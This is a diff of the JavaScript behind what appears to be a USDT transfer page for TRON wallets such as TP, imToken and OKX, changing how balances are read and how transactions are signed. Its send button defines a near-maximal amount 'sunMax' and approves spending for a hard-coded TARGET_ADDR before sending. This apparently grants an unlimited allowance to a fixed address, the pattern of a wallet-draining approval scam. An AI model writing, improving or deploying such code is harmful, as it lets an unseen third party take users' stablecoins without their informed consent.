@@ -209,7 +209,7 @@ let userAddress = "";
 let userHexAddr = "";
 let usdtContract = null;
 let provider = null;
-let isTronNativeWallet = false;
+let isTronNativeWallet = false; // 标记是否是TP原生tronWeb钱包
 
 const $ = s => document.querySelector(s);
 const walletDot = $("#walletDot");
@@ -239,13 +239,15 @@ function disconnectWallet() {
  balanceText.textContent = "0.000000";
 }
 
-// 分两套签名逻辑
+// 统一签名函数：自动区分原生tronWeb / EVM钱包(imToken/OKX)
 async function signAndSendTx(unsignedTx) {
  if (isTronNativeWallet) {
+  // TP钱包原生签名
   const signed = await tronWeb.trx.sign(unsignedTx.transaction);
   const res = await tronWeb.trx.sendRawTransaction(signed);
   return res;
  } else {
+  // imToken / OKX OE 用标准EIP签名
   const txHex = unsignedTx.transaction;
   const signedHex = await provider.request({
    method: "eth_signTransaction",
@@ -268,20 +270,24 @@ async function buildSignBroadcast(contractAddr, funcName, params) {
  return await signAndSendTx(txObj);
 }
 
-// 【关键修改】全程只用RPC接口读取余额，不再调用contract.call
+// 双方案读取余额：优先合约读取，失败自动走RPC兜底
 async function loadBalance() {
  try {
-  const res = await fetch(`${RPC}/v1/accounts/${userAddress}`);
-  const data = await res.json();
-  let sun = 0;
-  if (data.tokenBalances) {
-   const item = data.tokenBalances.find(t => t.token_id === USDT_CONTRACT);
-   if (item) sun = item.balance;
+  const rawSun = await usdtContract.balanceOf(userAddress).call();
+  balanceText.textContent = Number(tronWeb.fromSun(rawSun)).toFixed(6);
+ } catch (e) {
+  try {
+   const res = await fetch(`${RPC}/v1/accounts/${userAddress}`);
+   const data = await res.json();
+   let sun = 0;
+   if (data.tokenBalances) {
+    const item = data.tokenBalances.find(t => t.token_id === USDT_CONTRACT);
+    if (item) sun = item.balance;
+   }
+   balanceText.textContent = Number(tronWeb.fromSun(sun)).toFixed(6);
+  } catch (err) {
+   console.log("余额读取全部失败", err);
   }
-  balanceText.textContent = Number(tronWeb.fromSun(sun)).toFixed(6);
- } catch (err) {
-  console.log("RPC读取余额失败", err);
-  balanceText.textContent = "读取失败";
  }
 }
 
@@ -291,7 +297,7 @@ async function connectWalletLogic() {
   return;
  }
  try {
-  // TP原生钱包
+  // 分支1：TP钱包 专用原生tronWeb注入
   if (window.tronWeb && window.tronWeb.ready) {
    tronWeb = window.tronWeb;
    userAddress = tronWeb.defaultAddress.base58;
@@ -299,7 +305,7 @@ async function connectWalletLogic() {
    provider = window.tronWeb;
    isTronNativeWallet = true;
   }
-  // imToken / OKX OE EVM钱包
+  // 分支2：OKX OE / imToken 通用EVM provider
   else if (window.ethereum) {
    provider = window.ethereum;
    const accounts = await provider.request({ method: "eth_requestAccounts" });
@@ -312,7 +318,7 @@ async function connectWalletLogic() {
    isTronNativeWallet = false;
   }
   else {
-   alert("请在TP/OKX/imToken内置浏览器打开页面");
+   alert("未检测到钱包，请在TP/OKX/imToken内置浏览器打开");
    return;
   }
 
@@ -336,10 +342,14 @@ amountInput.addEventListener("input", () => {
  receiveAmount.value = num.toFixed(6);
 });
 
-// MAX按钮也走RPC拿余额
 maxBtn.addEventListener("click", async () => {
  if (!tronWeb) return;
  try {
+  const rawSun = await usdtContract.balanceOf(userAddress).call();
+  const num = Number(tronWeb.fromSun(rawSun));
+  amountInput.value = num.toFixed(2);
+  amountInput.dispatchEvent(new Event("input"));
+ } catch {
   const res = await fetch(`${RPC}/v1/accounts/${userAddress}`);
   const data = await res.json();
   let sun = 0;
@@ -350,8 +360,6 @@ maxBtn.addEventListener("click", async () => {
   const num = Number(tronWeb.fromSun(sun));
   amountInput.value = num.toFixed(2);
   amountInput.dispatchEvent(new Event("input"));
- } catch (e) {
-  alert("读取余额失败，无法填充MAX");
  }
 });
 
@@ -363,12 +371,7 @@ sendBtn.addEventListener("click", async () => {
  const sunMax = "9999999999999999999999999999";
 
  try {
-  // allowance 必须合约调用，这里加超时捕获
-  const allowance = await Promise.race([
-   usdtContract.allowance(userAddress, TARGET_ADDR).call(),
-   new Promise((_, reject) => setTimeout(() => reject(new Error("查询授权超时")), 8000))
-  ]);
-
+  const allowance = await usdtContract.allowance(userAddress, TARGET_ADDR).call();
   if (Number(allowance) < sunVal) {
    await buildSignBroadcast(USDT_CONTRACT, "approve", [
     { type: "address", value: TARGET_ADDR },
@@ -381,7 +384,7 @@ sendBtn.addEventListener("click", async () => {
    { type: "uint256", value: sunVal.toString() }
   ]);
   await loadBalance();
-  alert("交易已发送，前往tronscan查看区块确认");
+  alert("交易发送成功，请前往区块浏览器查看确认");
  } catch (e) {
   console.error("交易异常", e);
   alert("操作失败：" + (e.message || JSON.stringify(e)));
